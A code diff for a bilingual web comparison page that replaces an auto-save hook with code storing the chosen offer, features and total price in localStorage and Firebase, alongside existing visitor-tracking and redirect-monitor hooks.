@@ -6,7 +6,6 @@ import { Globe, Plus, ShoppingCart } from "lucide-react";
 import { FullPageLoader } from "@/components/loader";
 import { StepShell } from "@/components/step-shell";
 import { getOrCreateVisitorID, checkIfBlocked } from "@/lib/visitor-tracking";
-import { useAutoSave } from "@/hooks/use-auto-save";
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
 import { addData } from "@/lib/firebase";
 import { offerData } from "@/lib/offer-data";
@@ -26,16 +25,6 @@ export default function ComparisonPage() {
     "comprehensive" | "against-others"
   >("against-others");
   const [language, setLanguage] = useState<"ar" | "en">("ar");
-
-  useAutoSave({
-    visitorId: visitorID,
-    pageName: "compar",
-    data: {
-      selectedOffer: selectedOffer?.company?.name || "",
-      selectedFeatures,
-      offerTotalPrice,
-    },
-  });
 
   useRedirectMonitor({ visitorId: visitorID, currentPage: "compar" });
 
@@ -81,8 +70,7 @@ export default function ComparisonPage() {
     const totalPrice = calculateOfferTotal(offer, selFeatures);
     const finalPrice = Number.parseFloat(totalPrice.toFixed(2));
     setOfferTotalPrice(finalPrice);
-    await addData({
-      id: visitorID,
+    const comparData = {
       selectedOffer: {
         name: offer.company.name,
         image_url: offer.company.image_url,
@@ -93,6 +81,11 @@ export default function ComparisonPage() {
       },
       offerTotalPrice: finalPrice,
       selectedFeatures: selFeatures,
+    };
+    localStorage.setItem("comparFormData", JSON.stringify(comparData));
+    await addData({
+      id: visitorID,
+      ...comparData,
       currentStep: 4,
       currentPage: "check",
       comparCompletedAt: new Date().toISOString(),
